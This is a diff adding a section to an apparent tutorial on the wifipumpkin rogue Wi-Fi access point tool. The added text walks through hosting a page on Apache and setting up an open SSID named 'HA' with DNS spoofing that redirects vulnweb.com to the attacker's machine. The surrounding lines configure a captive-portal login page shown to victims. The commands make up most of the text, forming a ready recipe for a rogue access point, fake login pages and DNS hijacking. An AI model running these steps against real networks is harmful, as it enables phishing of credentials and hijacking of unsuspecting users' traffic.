@@ -103,7 +103,37 @@ Now make the attack, but this time, use our customized captive flask we have dow
     set interface wlan0
     set ssid Open Wifi
     set proxy captiveflask
-    set captiveflask.facebook true
+    set captiveflask.example true
     ignore pydns_server
     start
 
+Now, the victim will see a login page according to the template we chose to install.
+
+#### 6) DNS Spoofing
+
+Just as we can use the customized flask, which is in the tool, we could also use the HTML document, which we have created, and would like to use it for the attack on a user. Below, we can see that we are in the
+“www” “HTML” directory here is where any HTML file that we need to use for a website is located, we
+would create an HTML file which displays “lorem ipsum dolor sit amet consectetur adipiscing elit” below, we would see the
+walkthrough on how to do this.
+
+    cd /var/www/html
+    echo "lorem ipsum dolor sit amet consectetur adipiscing elit" > index.html
+    service apache2 start
+    ifconfig eth0
+
+Now that we have created the HTML file and know the IP address for our Ethernet cable, let's go into
+wifipumpkin and try to add this new HTML file to our command, and see how we can spoof the DNS server
+so that when we visit the site, the DNS server will spoof it to the page, which we want it to be
+
+    set interface wlan0
+    set ssid HA
+    set proxy noproxy
+    ignore pydns_server
+    show
+    use spoof.dns_spoof
+    set domains vulnweb.com
+    set redirectTo 192.168.1.2
+    start
+
+Now, when the victim connects to the SSID "HA", and visits the webpage "vulnweb.com", he would be redirected by the DNS server to the page which we created on our attacking
+machine.
